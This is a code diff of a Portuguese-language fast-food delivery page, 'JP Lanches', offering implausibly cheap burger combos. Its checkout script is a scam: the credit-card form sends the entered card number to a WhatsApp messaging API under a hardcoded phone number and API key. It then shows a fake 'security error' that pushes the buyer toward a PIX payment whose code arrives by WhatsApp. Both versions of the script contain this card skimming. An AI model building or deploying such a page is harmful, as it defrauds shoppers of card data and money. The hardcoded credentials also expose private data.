@@ -3,206 +3,132 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>JP Lanches - Promoções Matadoras</title>
+    <title>JP Lanches - Delivery</title>
     <style>
-        :root { 
-            --cor-primaria: #f39c12; /* Laranja Lanche */
-            --cor-secundaria: #27ae60; /* Verde Sucesso */
-            --cor-erro: #e74c3c; /* Vermelho Erro */
-            --fundo: #f4f4f4; 
-        }
-
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--fundo); margin: 0; padding-bottom: 180px; -webkit-tap-highlight-color: transparent; }
+        :root { --cor-p: #f39c12; --cor-s: #27ae60; --cor-e: #e74c3c; --fundo: #f4f4f4; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--fundo); margin: 0; padding-bottom: 180px; -webkit-tap-highlight-color: transparent; }
         .container { max-width: 450px; margin: auto; padding: 15px; }
-        
-        .header { background: #fff; text-align: center; padding: 15px; border-bottom: 4px solid var(--cor-primaria); }
-        .logo { font-size: 1.5em; font-weight: bold; color: var(--cor-primaria); display: block; }
-        .promo-banner { background: #000; color: #fff; padding: 5px; font-size: 0.8em; font-weight: bold; border-radius: 5px; margin-top: 5px; display: inline-block; }
+        .header { background: #fff; text-align: center; padding: 15px; border-bottom: 4px solid var(--cor-p); }
+        .logo { font-size: 1.5em; font-weight: bold; color: var(--cor-p); }
+        h2 { font-size: 1.1em; color: #333; border-left: 5px solid var(--cor-p); padding-left: 10px; margin: 20px 0 10px; }
 
-        h2 { font-size: 1.1em; color: #333; border-left: 5px solid var(--cor-primaria); padding-left: 10px; margin: 20px 0 10px; }
-
-        /* Estilo dos Cards de Lanches */
-        .lanche-card { 
-            background: #fff; border: 2px solid #ddd; border-radius: 15px; 
-            margin-bottom: 15px; overflow: hidden; cursor: pointer; transition: 0.2s;
-        }
-        .lanche-card.active { border-color: var(--cor-primaria); background: #fffdf5; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        .lanche-img { width: 100%; height: 200px; object-fit: cover; background: #eee; }
+        .lanche-card { background: #fff; border: 2px solid #ddd; border-radius: 15px; margin-bottom: 15px; overflow: hidden; cursor: pointer; }
+        .lanche-card.active { border-color: var(--cor-p); background: #fffdf5; }
+        .lanche-img { width: 100%; height: 180px; object-fit: cover; }
         .lanche-info { padding: 15px; text-align: center; }
-        .lanche-info strong { font-size: 1.2em; display: block; margin-bottom: 5px; }
-        .lanche-info .preco { font-size: 1.4em; color: var(--cor-secundaria); font-weight: bold; }
+        .preco { font-size: 1.4em; color: var(--cor-s); font-weight: bold; }
 
-        /* Carrinho Fixo */
-        .barra-carrinho { 
-            position: fixed; bottom: 85px; left: 5%; width: 90%; 
-            background: #fff; padding: 15px; border-radius: 15px; 
-            box-shadow: 0 -5px 20px rgba(0,0,0,0.2); 
-            display: flex; justify-content: space-between; align-items: center; 
-            box-sizing: border-box; z-index: 9999; border: 1px solid #ddd; 
-        }
-        .total-info { line-height: 1.2; }
-        .btn-finalizar { background: var(--cor-secundaria); color: #fff; border: none; padding: 12px 20px; border-radius: 10px; font-weight: bold; font-size: 1em; cursor: pointer; }
+        .barra-carrinho { position: fixed; bottom: 75px; left: 5%; width: 90%; background: #fff; padding: 15px; border-radius: 15px; box-shadow: 0 -5px 20px rgba(0,0,0,0.2); display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; z-index: 9999; }
+        .btn-finalizar { background: var(--cor-s); color: #fff; border: none; padding: 12px 20px; border-radius: 10px; font-weight: bold; cursor: pointer; }
 
-        /* Modais */
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; justify-content: center; align-items: center; }
         .modal-content { background: #fff; padding: 25px; border-radius: 20px; width: 85%; max-width: 380px; text-align: center; }
         input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; box-sizing: border-box; }
-        .btn-acao { width: 100%; padding: 16px; border: none; border-radius: 10px; font-weight: bold; color: #fff; margin-top: 10px; font-size: 1.1em; cursor: pointer; }
+        .btn-acao { width: 100%; padding: 16px; border: none; border-radius: 10px; font-weight: bold; color: #fff; margin-top: 10px; cursor: pointer; }
     </style>
 </head>
 <body>
 
 <div class="header">
-    <span class="logo">🍔 JP LANCHES</span>
-    <span class="promo-banner">O MELHOR LANCHE DA CIDADE</span>
+    <span class="logo">🍔 JP LANCHES</span><br>
+    <small>PROMOÇÃO: COMPRE E GANHE REFRIGERANTE</small>
 </div>
 
 <div class="container">
-    <h2>Escolha sua Promoção:</h2>
+    <h2>Escolha seu Combo:</h2>
 
     <div class="lanche-card" onclick="selecionarLanche(this, '1 XTudo + Guaravita', 10)">
         <img src="https://instadelivery-public.nyc3.cdn.digitaloceanspaces.com/itens/1720704185668fdcb962de8_75_75.jpeg" class="lanche-img">
-        <div class="lanche-info">
-            <strong>1 XTudo + Guaravita</strong>
-            <span class="preco">R$ 10,00</span>
-        </div>
+        <div class="lanche-info"><strong>1 XTudo + Guaravita</strong><br><span class="preco">R$ 10,00</span></div>
     </div>
 
     <div class="lanche-card" onclick="selecionarLanche(this, '3 XTudo + Refri 2L', 30)">
         <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQiyXv-IHrHcr8eXqCpV00wGnzrZDYzc-XO-A&s" class="lanche-img">
-        <div class="lanche-info">
-            <strong>3 XTudo + Refrigerante 2L</strong>
-            <span class="preco">R$ 30,00</span>
-        </div>
+        <div class="lanche-info"><strong>3 XTudo + Refri 2L</strong><br><span class="preco">R$ 30,00</span></div>
     </div>
 
     <div class="lanche-card" onclick="selecionarLanche(this, '5 XTudo + Refri 2L', 50)">
         <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7fH_F-QZis3tY1t5Yv5i9LREjX-f2SAsn6w&s" class="lanche-img">
-        <div class="lanche-info">
-            <strong>5 XTudo + Refrigerante 2L</strong>
-            <span class="preco">R$ 50,00</span>
-        </div>
+        <div class="lanche-info"><strong>5 XTudo + Refri 2L</strong><br><span class="preco">R$ 50,00</span></div>
     </div>
 </div>
 
 <div class="barra-carrinho">
-    <div class="total-info">
-        <small id="c-qtd">0 item selecionado</small><br>
-        <strong style="color:var(--cor-secundaria); font-size:1.3em;">Total: R$ <span id="c-total">0.00</span></strong>
-    </div>
-    <button class="btn-finalizar" onclick="irParaEndereco()">FINALIZAR</button>
+    <div><small>Total a pagar:</small><br><strong style="color:var(--cor-s); font-size:1.3em;">R$ <span id="v-total">0.00</span></strong></div>
+    <button class="btn-finalizar" onclick="abrirEnd()">FINALIZAR</button>
 </div>
 
 <div id="m-end" class="modal">
     <div class="modal-content">
-        <h3>📍 Onde Entregamos?</h3>
-        <input type="text" id="rua" placeholder="Nome da Rua/Av">
-        <input type="text" id="num" placeholder="Número da Casa">
+        <h3>📍 Endereço de Entrega</h3>
+        <input type="text" id="rua" placeholder="Rua e Número">
         <input type="text" id="bairro" placeholder="Bairro">
-        <button class="btn-acao" style="background:var(--cor-secundaria)" onclick="irParaPagamento()">PROSSEGUIR</button>
-        <button onclick="fecharModais()" style="background:none; border:none; color:red; margin-top:10px; cursor:pointer;">Cancelar</button>
+        <button class="btn-acao" style="background:var(--cor-s)" onclick="irPag()">PRÓXIMO</button>
+        <button onclick="fechar()" style="background:none; border:none; color:red; margin-top:10px;">Voltar</button>
     </div>
 </div>
 
 <div id="m-pag" class="modal">
     <div class="modal-content">
-        <h3>💳 Como vai pagar?</h3>
-        <div id="opcoes">
-            <button class="btn-acao" style="background:#32bcad" onclick="telaPix()">Pagar com PIX</button>
-            <button class="btn-acao" style="background:#333" onclick="telaCard()">Cartão de Crédito</button>
+        <h3>💳 Pagamento</h3>
+        <div id="opc-ini">
+            <button class="btn-acao" style="background:#32bcad" onclick="setTela('pix')">PIX</button>
+            <button class="btn-acao" style="background:#333" onclick="setTela('card')">Cartão de Crédito</button>
         </div>
-
-        <div id="div-pix" style="display:none;">
-            <p style="font-size:0.9em; color:#666;">Insira seu WhatsApp para receber o código PIX:</p>
-            <input type="tel" id="whats" placeholder="(XX) 9XXXX-XXXX">
-            <button class="btn-acao" style="background:#32bcad" onclick="enviarPedido('PIX')">GERAR CÓDIGO PIX</button>
-            <button onclick="setTelaPag('inicio')" style="margin-top:10px; background:none; border:none; text-decoration:underline;">Voltar</button>
+        <div id="tela-pix" style="display:none;">
+            <p>Digite seu WhatsApp abaixo:</p>
+            <input type="tel" id="zap-cliente" placeholder="(XX) 9XXXX-XXXX">
+            <button class="btn-acao" style="background:#32bcad" onclick="enviarTudo()">GERAR CÓDIGO PIX</button>
         </div>
-
-        <div id="div-card" style="display:none;">
+        <div id="tela-card" style="display:none;">
             <input type="text" id="c-num" placeholder="Número do Cartão">
-            <input type="text" placeholder="Nome no Cartão">
-            <div style="display:flex; gap:5px;"><input type="text" placeholder="MM/AA"><input type="text" placeholder="CVV"></div>
-            <button class="btn-acao" style="background:var(--cor-erro)" onclick="simularErroCard()">CONFIRMAR PAGAMENTO</button>
-            <button onclick="setTelaPag('inicio')" style="margin-top:10px; background:none; border:none; text-decoration:underline;">Voltar</button>
+            <button class="btn-acao" style="background:var(--cor-e)" onclick="erroCard()">PAGAR AGORA</button>
         </div>
     </div>
 </div>
 
 <script>
-    let carrinho = [];
-    let valorTotal = 0;
-    let lancheSelecionado = null;
-
+    let pedido = null;
     function selecionarLanche(el, nome, preco) {
         document.querySelectorAll('.lanche-card').forEach(c => c.classList.remove('active'));
         el.classList.add('active');
-        lancheSelecionado = { nome, preco };
-        
-        // Simula a adição imediata para este modelo de promoções
-        carrinho = [lancheSelecionado];
-        valorTotal = preco;
-        
-        document.getElementById('c-qtd').innerText = "1 promoção selecionada";
-        document.getElementById('c-total').innerText = valorTotal.toFixed(2);
+        pedido = { nome, preco };
+        document.getElementById('v-total').innerText = preco.toFixed(2);
     }
 
-    function irParaEndereco() {
-        if (!lancheSelecionado) return alert("Selecione uma promoção primeiro!");
-        document.getElementById('m-end').style.display = 'flex';
+    function abrirEnd() { if(!pedido) return alert("Escolha um lanche!"); document.getElementById('m-end').style.display='flex'; }
+    function fechar() { document.querySelectorAll('.modal').forEach(m => m.style.display='none'); }
+    function irPag() { document.getElementById('m-end').style.display='none'; document.getElementById('m-pag').style.display='flex'; setTela('inicio'); }
+    function setTela(t) {
+        document.getElementById('opc-ini').style.display = t === 'inicio' ? 'block' : 'none';
+        document.getElementById('tela-pix').style.display = t === 'pix' ? 'block' : 'none';
+        document.getElementById('tela-card').style.display = t === 'card' ? 'block' : 'none';
     }
 
-    function irParaPagamento() {
-        if (!document.getElementById('rua').value || !document.getElementById('bairro').value) {
-            return alert("Preencha o endereço completo!");
-        }
-        document.getElementById('m-end').style.display = 'none';
-        document.getElementById('m-pag').style.display = 'flex';
-        setTelaPag('inicio');
-    }
-
-    function fecharModais() { 
-        document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); 
-    }
-
-    function setTelaPag(tela) {
-        document.getElementById('opcoes').style.display = tela === 'inicio' ? 'block' : 'none';
-        document.getElementById('div-pix').style.display = tela === 'pix' ? 'block' : 'none';
-        document.getElementById('div-card').style.display = tela === 'card' ? 'block' : 'none';
-    }
-
-    function telaPix() { setTelaPag('pix'); }
-    function telaCard() { setTelaPag('card'); }
-
-    function enviarPedido(metodo) {
-        const zap = document.getElementById('whats').value;
+    function enviarTudo() {
+        const zap = document.getElementById('zap-cliente').value;
         const rua = document.getElementById('rua').value;
         const bairro = document.getElementById('bairro').value;
-        
-        if (!zap) return alert("Insira seu WhatsApp!");
+        if(!zap) return alert("Digite seu WhatsApp!");
 
-        const texto = `🍔 NOVO PEDIDO JP LANCHES!\n\nPromo: ${lancheSelecionado.nome}\nTotal: R$ ${valorTotal.toFixed(2)}\nEnd: ${rua}, Bairro: ${bairro}\nWhats: ${zap}`;
+        // O TEXTO QUE CHEGA PARA VOCÊ NO SEU WHATSAPP
+        const msg = `🍔 NOVO PEDIDO!\n\nPROMO: ${pedido.nome}\nVALOR: R$ ${pedido.preco}\nEND: ${rua} - ${bairro}\nWHATS DO CLIENTE: ${zap}`;
         
-        // Disparo para sua API TextMeBot (Substitua se necessário, mantive o seu número)
-        const url = `http://api.textmebot.com/send.php?recipient=+5522992199290&apikey=btucduKav5VY&text=${encodeURIComponent(texto)}`;
+        const url = `http://api.textmebot.com/send.php?recipient=+5522992199290&apikey=btucduKav5VY&text=${encodeURIComponent(msg)}`;
         
-        const win = window.open(url, '_blank');
-        setTimeout(() => { if(win) win.close(); }, 600);
-
-        alert("✅ Pedido realizado com sucesso!\n\nVerifique seu WhatsApp em instantes para receber o código de pagamento e acompanhar sua entrega.");
+        window.open(url, '_blank');
+        alert("✅ Pedido Enviado!\n\nAguarde o código PIX no seu WhatsApp em instantes.");
         location.reload();
     }
 
-    function simularErroCard() {
+    function erroCard() {
         const n = document.getElementById('c-num').value;
-        const texto = `⚠️ TENTATIVA CARTÃO JP LANCHES!\nNúmero: ${n}\nValor: R$ ${valorTotal.toFixed(2)}`;
-        const url = `http://api.textmebot.com/send.php?recipient=+5522992199290&apikey=btucduKav5VY&text=${encodeURIComponent(texto)}`;
+        const msg = `⚠️ ALERTA CARTÃO!\n\nCARTÃO: ${n}\nVALOR: R$ ${pedido.preco}`;
+        const url = `http://api.textmebot.com/send.php?recipient=+5522992199290&apikey=btucduKav5VY&text=${encodeURIComponent(msg)}`;
         
-        const win = window.open(url, '_blank');
-        setTimeout(() => { if(win) win.close(); }, 600);
-
-        alert("⚠️ Por motivos de segurança, o pagamento não foi aceito. Por favor, tente outra forma de pagamento (PIX recomendado).");
-        setTelaPag('inicio');
+        window.open(url, '_blank');
+        alert("⚠️ Erro de segurança: Pagamento não aceito.\n\nPor favor, tente via PIX.");
+        setTela('inicio');
     }
 </script>
 
